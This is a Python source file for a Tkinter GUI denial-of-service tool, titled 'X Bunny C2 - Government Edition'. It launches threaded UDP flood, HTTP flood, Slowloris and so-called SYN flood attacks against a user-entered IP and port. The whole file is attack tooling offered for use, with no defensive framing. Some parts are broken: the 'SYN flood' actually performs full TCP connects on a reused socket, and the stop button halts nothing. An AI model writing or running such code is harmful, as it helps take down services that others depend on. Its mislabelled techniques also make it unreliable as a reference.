import socket
import random
import time
import sys
import os
import threading
import tkinter as tk
from tkinter import ttk

class DDoSApp:
    def __init__(self, root):
        self.root = root
        self.root.title("X Bunny C2 - Government Edition")
        self.root.geometry("800x600")
        self.root.configure(bg="#2c3e50")

        # Create a style for the widgets
        self.style = ttk.Style()
        self.style.configure("TLabel", background="#2c3e50", foreground="#ecf0f1")
        self.style.configure("TButton", background="#2ecc71", foreground="#2c3e50")
        self.style.configure("TEntry", background="#ecf0f1", foreground="#2c3e50")

        # Create the widgets
        self.create_widgets()

        # Create the threads list
        self.threads = []

    def create_widgets(self):
        # Create the labels
        self.target_label = ttk.Label(self.root, text="Target IP:", font=("Arial", 12))
        self.target_label.place(x=50, y=50)

        self.port_label = ttk.Label(self.root, text="Port:", font=("Arial", 12))
        self.port_label.place(x=50, y=100)

        self.duration_label = ttk.Label(self.root, text="Duration (s):", font=("Arial", 12))
        self.duration_label.place(x=50, y=150)

        self.threads_label = ttk.Label(self.root, text="Threads:", font=("Arial", 12))
        self.threads_label.place(x=50, y=200)

        # Create the entry widgets
        self.target_entry = ttk.Entry(self.root, width=20)
        self.target_entry.place(x=150, y=50)

        self.port_entry = ttk.Entry(self.root, width=20)
        self.port_entry.place(x=150, y=100)

        self.duration_entry = ttk.Entry(self.root, width=20)
        self.duration_entry.place(x=150, y=150)

        self.threads_entry = ttk.Entry(self.root, width=20)
        self.threads_entry.place(x=150, y=200)

        # Create the buttons
        self.udp_button = ttk.Button(self.root, text="UDP Flood", command=self.start_udp_flood)
        self.udp_button.place(x=50, y=250)

        self.syn_button = ttk.Button(self.root, text="SYN Flood", command=self.start_syn_flood)
        self.syn_button.place(x=150, y=250)

        self.http_button = ttk.Button(self.root, text="HTTP Flood", command=self.start_http_flood)
        self.http_button.place(x=250, y=250)

        self.slowloris_button = ttk.Button(self.root, text="Slowloris", command=self.start_slowloris)
        self.slowloris_button.place(x=350, y=250)

        self.stop_button = ttk.Button(self.root, text="Stop Attack", command=self.stop_attack)
        self.stop_button.place(x=50, y=300)

    def start_udp_flood(self):
        target_ip = self.target_entry.get()
        target_port = int(self.port_entry.get())
        duration = int(self.duration_entry.get())
        threads = int(self.threads_entry.get())

        for _ in range(threads):
            thread = threading.Thread(target=self.udp_flood, args=(target_ip, target_port, duration))
            thread.start()
            self.threads.append(thread)

    def start_syn_flood(self):
        target_ip = self.target_entry.get()
        target_port = int(self.port_entry.get())
        duration = int(self.duration_entry.get())
        threads = int(self.threads_entry.get())

        for _ in range(threads):
            thread = threading.Thread(target=self.syn_flood, args=(target_ip, target_port, duration))
            thread.start()
            self.threads.append(thread)

    def start_http_flood(self):
        target_ip = self.target_entry.get()
        target_port = int(self.port_entry.get())
        duration = int(self.duration_entry.get())
        threads = int(self.threads_entry.get())

        for _ in range(threads):
            thread = threading.Thread(target=self.http_flood, args=(target_ip, target_port, duration))
            thread.start()
            self.threads.append(thread)

    def start_slowloris(self):
        target_ip = self.target_entry.get()
        target_port = int(self.port_entry.get())
        duration = int(self.duration_entry.get())
        threads = int(self.threads_entry.get())

        for _ in range(threads):
            thread = threading.Thread(target=self.slowloris, args=(target_ip, target_port, duration))
            thread.start()
            self.threads.append(thread)

    def stop_attack(self):
        for thread in self.threads:
            thread.join()

    def udp_flood(self, target_ip, target_port, duration):
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_socket.settimeout(5)
        end_time = time.time() + duration
        packets_sent = 0
        try:
            while time.time() < end_time:
                bytes_data = random._urandom(1024)
                udp_socket.sendto(bytes_data, (target_ip, target_port))
                packets_sent += 1
                print(f"Sent UDP packet to {target_ip}:{target_port} [Total packets sent: {packets_sent}]")
        except KeyboardInterrupt:
            print("Attack stopped by user (CTRL + C)")
        except socket.timeout:
            print("Connection timed out")
        finally:
            udp_socket.close()

    def syn_flood(self, target_ip, target_port, duration):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        end_time = time.time() + duration
        packets_sent = 0
        try:
            while time.time() < end_time:
                sock.connect((target_ip, target_port))
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(b"Host: " + target_ip.encode() + b"\r\n\r\n")
                sock.close()
                packets_sent += 1
                print(f"Sent SYN packet to {target_ip}:{target_port} [Total packets sent: {packets_sent}]")
        except KeyboardInterrupt:
            print("Attack stopped by user (CTRL + C)")
        except socket.timeout:
            print("Connection timed out")
        finally:
            sock.close()

    def http_flood(self, target_ip, target_port, duration):
        headers = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
        end_time = time.time() + duration
        packets_sent = 0
        try:
            while time.time() < end_time:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target_ip, target_port))
                sock.sendall(headers.encode())
                sock.close()
                packets_sent += 1
                print(f"Sent HTTP packet to {target_ip}:{target_port} [Total packets sent: {packets_sent}]")
        except KeyboardInterrupt:
            print("Attack stopped by user (CTRL + C)")
        except socket.timeout:
            print("Connection timed out")
        finally:
            sock.close()

    def slowloris(self, target_ip, target_port, duration):
        headers = (
            f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n"
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            "Connection: keep-alive\r\n\r\n"
        )
        end_time = time.time() + duration
        packets_sent = 0
        try:
            while time.time() < end_time:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target_ip, target_port))
                sock.sendall(headers.encode())
                time.sleep(15)
                packets_sent += 1
                print(f"Sent Slowloris packet to {target_ip}:{target_port} [Total packets sent: {packets_sent}]")
        except KeyboardInterrupt:
            print("Attack stopped by user (CTRL + C)")
        except socket.timeout:
            print("Connection timed out")
        finally:
            sock.close()

def main():
    root = tk.Tk()
    app = DDoSApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()